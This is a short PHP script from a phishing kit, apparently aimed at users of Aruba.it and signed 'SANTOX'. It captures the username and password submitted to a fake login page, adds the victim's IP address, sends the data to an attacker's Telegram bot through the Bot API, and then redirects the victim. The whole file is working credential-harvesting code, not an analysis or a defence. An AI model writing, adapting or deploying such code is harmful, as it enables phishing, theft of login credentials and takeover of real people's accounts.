<?php

include "config.php";

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");




if(isset($_POST['sub'])){
	$message .= '

 ------------ Arruba it ------------
User   =  '.$_POST['log'].'
Pass  =  '.$_POST['pass'].'

------------ '.$ip.' ------------
-------------------By SANTOX  ------------------
';
file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message)."" );




    header("Refresh: 0; URL=./");
    exit();
}


?>